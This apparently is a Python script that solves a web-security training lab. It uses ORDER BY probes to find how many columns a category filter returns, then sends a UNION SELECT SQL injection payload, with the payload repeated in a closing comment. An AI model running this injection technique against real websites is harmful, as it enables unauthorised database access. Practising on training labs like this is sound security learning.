import requests

session = requests.session()
number_of_columns = 0

burp0_url = "https://ac6b1fd91e515299c0ac2395000b00ba.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"session": "9Sj5w8YABHv2U7D0Tim3H2CU0duprsIv"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac6b1fd91e515299c0ac2395000b00ba.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}

cookies = burp0_cookies
headers = burp0_headers

def send_request_order_by(number: int):
    url = str(burp0_url + f"'+ORDER+BY+{number}--+-")
    print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    print(response)
    if response.status_code == 200:
        return True
    else:
        return False

def send_payload(number_of_columns, burp0_url):
    sqli_payload = f" UNION SELECT {('NULL, ' * number_of_columns)[:-1]} FROM information_schema.tables-- -"
    loaded_url = str(burp0_url + sqli_payload)
    print(loaded_url)
    response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    print(response)


if __name__ == '__main__':
    for i in range(10, 0, -1):
        print(f"trying {i}")
        if send_request_order_by(i):
            number_of_columns = i
            print(f"this is the number of columns to UNION: {i}.\nUse it wisely")
            break
    send_payload(number_of_columns, burp0_url)

# dont need to write 'verify' because verification is a default in recent urllib
# just copy cacert.pem to: ./venv/lib/python3.9/site-packages/certifi/

# PayLoad:
# UNION SELECT NULL,NULL,NULL FROM information_schema.tables--+-

